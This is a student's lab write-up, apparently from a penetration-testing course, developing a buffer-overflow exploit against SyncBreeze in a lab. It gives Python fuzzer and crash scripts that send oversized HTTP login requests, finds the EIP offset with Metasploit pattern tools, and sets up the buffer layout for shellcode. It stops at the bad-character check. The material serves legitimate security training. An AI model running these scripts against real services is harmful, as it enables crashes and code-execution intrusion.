# 11.1.2 Discovering the Vulnerability
## Practice - Discovering the Vulnerability

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Build the fuzzer and replicate the SyncBreeze crash.
To start we must first build a fuzzer using python. We can use the following code:
```python
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.222.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.222.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("192.168.222.10", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()
```
We must now start the syncbreeze service and attach Immunity Debugger to said service. Once this is done we can begin our fuzzer script, watching the Immunity Debugger window for crashes.
We see that the Immunity Debugger notes a crash at 800 bytes.


2.  Inspect the content of other registers and stack memory. Does anything seem to be directly influenced by the fuzzing input?
The ESP register contains "A's" and we can also see the "A" characters on the stack itself.
![[Pasted image 20220706175131.png]]


# 11.2.4 Controlling EIP
## Practice - Controlling EIP

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Write a standalone script to replicate the crash.
The following python3 script will lead to a crash:
```python
#!/usr/bin/python
import socket

try:
	print("\nAttempting to send buffer...")

	size = 800
	inputbuffer = "A" * size

	content = "username=" + inputbuffer + "&password=A"

	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.222.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://192.168.222.10/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	  
	buffer += content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  
	s.connect(("192.168.222.10", 80))
	encoded = buffer.encode()
	s.send(encoded)
		  
	s.close()

	print("\nSuccess!")

except:
	print("\nCould not connect")
```

2.  Determine the offset within the input buffer to successfully control EIP. &
3. Update your standalone script to place a unique value into EIP to ensure your offset is correct.
To do this we simply need to create a pattern buffer with a length of 800 using the metasploit tool "msf-pattern_offset". Once we have this buffer generated we replace the "inputbuffer" variable in our previous code with this newly created pattern. We now see a our pattern has overwritten the EIP register
![[Pasted image 20220706230833.png]]

We can now use msf-pattern_offset to identify the exact location of this in our buffer is at offset 780. Accounting for this, we adjust our initial script:
```python
filler = "A" * 780
eip = "B" * 4
buffer = "C" * 16

inputBuffer = filler + eip + buffer
```

We now should have 4 B's present in the EIP register and ESP should contain C's.

![[Pasted image 20220706231410.png]]

# 11.2.8 Checking for Bad Characters
#### Exercises

_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_

1.  Repeat the required steps in order to identify the bad characters that cannot be included in the payload.
First we must extend our initial buffer in order to allow more space for the shell code. We simply increase our buffer from 800 to 1500 with the following snippet:
```python
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + buffer
```

We can see the ESP points to the D's we have copied.
![[Pasted image 20220707005808.png]]
Now that we have more room to work with we can begin checking for bad characters. We do this by replacing the D's with a list of hex characters.

2.  Why are these characters not allowed? How do these bad hex characters translate to ASCII?
